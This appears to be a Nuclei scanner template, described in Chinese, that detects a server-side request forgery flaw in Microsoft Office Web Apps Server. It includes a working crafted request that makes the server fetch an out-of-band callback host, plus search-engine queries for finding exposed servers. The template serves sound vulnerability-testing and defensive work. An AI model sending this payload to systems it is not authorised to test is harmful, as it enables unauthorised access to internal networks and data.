id: office-webapps-ssrf

info:
  name: Office Web Apps Server Full Read - 服务端请求伪造
  author: DhiyaneshDK
  severity: high
  description: |
    该模板用于检测 Office Web Apps Server Full Read - 服务端请求伪造。该类漏洞通常源于服务端按用户提供的地址发起请求，但缺少目标地址校验和内网访问限制。模板会向 `/oh/wopi/files/@/wFileId/contents?wFileId=http://{{oast}}/{{string}}.xlsx%3fbody={{string}}%2...` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可借助目标服务器访问内网管理接口、云元数据地址或其他受信任网络资源。
    - 在可回显或可外带的场景下，SSRF 可能导致敏感信息泄露、凭据获取或进一步攻击内部系统。
  remediation: |
    - 对服务端请求目标使用严格白名单，禁止访问内网网段、回环地址、链路本地地址和云元数据地址。
    - 校验跳转后的最终地址，限制协议类型，并为出站请求配置最小化网络权限。
    - 监控异常内网访问和外联请求，轮换可能通过元数据接口泄露的凭据。
  reference:
    - https://drive.google.com/file/d/1aeNq_5wVwHRR1np1jIRQM1hocrgcZ6Qu/view (Slide 37,38)
  classification:
    cpe: cpe:2.3:a:microsoft:office_web_apps_server:*:*:*:*:*:*:*:*
    cwe-id: CWE-918
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"Provide a link that opens Word"
    fofa-query: body="Provide a link that opens Word"
    product: office_web_apps_server
    vendor: microsoft
  tags: microsoft,office-webapps,redirect,vuln
variables:
  oast: "{{interactsh-url}}"
  string: "{{to_lower(rand_text_alpha(4))}}"

http:
  - raw:
      - |
        GET /oh/wopi/files/@/wFileId/contents?wFileId=http://{{oast}}/{{string}}.xlsx%3fbody={{string}}%26header=Location:http://oast.pro%26status=302&access_token_ttl=0 HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')
          - contains(body,'<h1> Interactsh Server </h1>')
          - status_code == 200
        condition: and
